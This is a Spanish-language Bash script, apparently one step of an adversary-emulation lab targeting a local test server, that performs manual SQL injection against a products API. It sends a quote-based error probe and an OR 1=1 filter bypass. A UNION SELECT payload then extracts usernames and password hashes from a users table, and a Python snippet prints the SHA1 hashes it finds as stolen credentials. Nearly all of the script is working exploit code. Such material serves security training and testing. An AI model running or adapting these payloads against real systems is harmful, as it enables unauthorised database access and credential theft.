#!/usr/bin/env bash
#
# Paso 4 - SQL Injection Manual (T1213)
# Exfiltración de datos mediante payloads SQL construidos manualmente
#
# Táctica: Colección
# Técnica MITRE: T1213 - Data from Information Repositories
#
# La consulta original tiene 3 columnas: id, nombre, precio
# Cualquier UNION SELECT debe tener exactamente 3 columnas.
#
# Uso: ./tests/pasos/04-sql-injection.sh [BASE_URL]
#   BASE_URL por defecto: http://192.168.56.112:8080

BASE_URL="${1:-http://192.168.56.112:8080}"
ENDPOINT="$BASE_URL/api/v1/productos"

separator() {
  echo
  echo "--- $1 ---"
  echo "==================================="
}

echo "==================================================================="
echo " PASO 4: Data from Information Repositories (T1213)"
echo " Inyeccion SQL manual en $ENDPOINT"
echo "==================================================================="

# 4a - Reconocimiento: comilla simple para romper la consulta
separator "4a) Reconocimiento - comilla simple"
echo "Payload: categoria=electronica'"
echo "Esperado: Error SQL (stack trace expuesto - CWE-200)"
curl -s -i -G "$ENDPOINT" --data-urlencode "categoria=electronica'" | head -n 25
echo

# 4b - Bypass: OR 1=1 para obtener todos los productos
separator "4b) Bypass de filtro - OR 1=1"
echo "Payload: categoria=x' OR 1=1 --"
echo "Esperado: Todos los productos (sin filtro de categoria)"
curl -s -G "$ENDPOINT" --data-urlencode "categoria=x' OR 1=1 -- "
echo

# 4c - Exfiltración: UNION SELECT (3 columnas para coincidir con productos)
#     tabla productos: id, nombre, precio
#     tabla usuarios:  id, username, password_hash, rol
#     Mapeo: id → id, username → nombre, password_hash → precio
separator "4c) Exfiltracion - UNION SELECT"
echo "Payload: categoria=nonexistent' UNION SELECT id, username, password_hash FROM usuarios --"
echo "Esperado: Datos de usuarios camuflados como productos"
RESULT=$(curl -s -G "$ENDPOINT" \
  --data-urlencode "categoria=nonexistent' UNION SELECT id, username, password_hash FROM usuarios -- ")
echo "$RESULT" | python3 -m json.tool 2>/dev/null || echo "$RESULT"
echo
echo "[+] CREDENCIALES OBTENIDAS (mapeo: nombre=username, precio=password_hash):"
echo "$RESULT" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for row in data:
    if isinstance(row.get('precio'), str) and len(row['precio']) == 40:
        print(f\"    Usuario: {row['nombre']} | Hash SHA1: {row['precio']}\")
" 2>/dev/null || echo "    (ver salida arriba)"
echo
